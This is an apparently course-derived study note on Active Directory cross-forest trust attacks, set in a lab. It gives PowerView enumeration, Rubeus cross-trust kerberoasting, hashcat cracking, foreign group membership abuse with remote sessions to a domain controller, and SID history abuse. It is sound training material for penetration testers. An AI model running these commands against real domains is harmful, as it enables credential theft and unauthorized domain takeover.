# Cross-Forest Trust Abuse — From Windows

## Overview
With an inbound or bidirectional forest/domain trust, several attacks can be performed across the trust boundary. Even if you can't escalate privileges in your current domain, you may be able to gain admin rights in the trusted domain.

---

## Attack 1 — Cross-Forest Kerberoasting

Kerberoasting and ASREPRoasting can be performed **across trusts** depending on trust direction.
### Step 1 — Enumerate accounts with SPNs in the target domain
```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

### Step 2 — Check group membership of interesting SPN accounts
```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
```
If the account is a **Domain Admin** in the target domain → cracking its hash = full admin there.

### Step 3 — Kerberoast across the trust with Rubeus
```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

### Step 4 — Crack the hash offline
```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

---

## Attack 2 — Admin Password Reuse Across Forests

In a bidirectional forest trust managed by the same company, admin accounts may reuse passwords across forests.

**Check for:**
- Same or similar admin usernames in both domains (e.g. `adm_bob.smith` in Domain A, `bsmith_admin` in Domain B)
- Identical passwords for built-in Administrator accounts across both forests

If Domain A is compromised and admin credentials are recovered, test them against Domain B immediately.

---

## Attack 3 — Foreign Group Membership

**Only Domain Local Groups** can contain security principals from outside the forest. Admins from Domain A may be members of privileged groups in Domain B.

### Enumerate foreign group members in the target domain
```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

### Resolve the SID to a readable name
```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
# INLANEFREIGHT\administrator
```

### Access the target DC using the foreign admin account
```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
If the INLANEFREIGHT admin is in the Administrators group of FREIGHTLOGISTICS.LOCAL → instant full admin access to the second domain.

---

## Attack 4 — SID History Abuse (Cross-Forest)

If a user is **migrated from Forest A to Forest B** and **SID Filtering is not enabled**, the old SID from Forest A can be added to the user's `SID History` attribute. When authenticating across the trust, the token includes both SIDs — granting the user whatever rights the old SID had in Forest A.

**Impact:** If the migrated user had admin rights in Forest A, they retain those rights even after moving to Forest B — effectively granting cross-forest privilege escalation.

> ⚠️ This attack will be covered in depth in a later module focused on AD trust attacks.

---

## Key Takeaways

| Attack | Requirement | Outcome |
|---|---|---|
| Cross-forest Kerberoasting | SPN account exists in target domain | Crack hash → admin in target domain |
| Password reuse | Bidirectional trust; same admin names | Instant access to second domain |
| Foreign group membership | Domain A admin in target Domain Local group | Full admin in target forest |
| SID History abuse | SID filtering disabled; migrated user | Retained cross-forest admin rights |

**Always check for these scenarios when a bidirectional forest trust is in scope.** Taking over one domain sometimes instantly gives access to another.